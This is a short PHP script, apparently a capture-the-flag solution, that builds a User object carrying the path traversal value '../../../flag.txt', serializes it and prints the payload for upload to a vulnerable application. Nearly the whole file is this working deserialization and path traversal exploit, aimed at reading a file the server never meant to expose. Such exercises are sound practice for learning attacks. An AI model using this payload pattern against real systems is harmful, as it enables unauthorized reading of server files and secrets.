<?php
        //Enter your code here, enjoy!

// import User class from data.php
class User{
  public $name;
  public $fid;
  public $items;

  function __construct($fid, $name){
    $this->id = $fid;
    $this->name = $name;
    $this->items = array(); 
  }

  public function addItem($fid){
    array_push($this->items, $fid);
  }

}

// create a user
$u = new User('1', 'Vechus');

// add dummy item, will open flag.txt
$u->addItem('../../../flag.txt');

// serialize the user, in order to upload later
$s = serialize($u);

echo $s;


// test index.php code
/*
foreach ($u->items as &$c) {
    printf("%s", new Item($c));
}*/

?>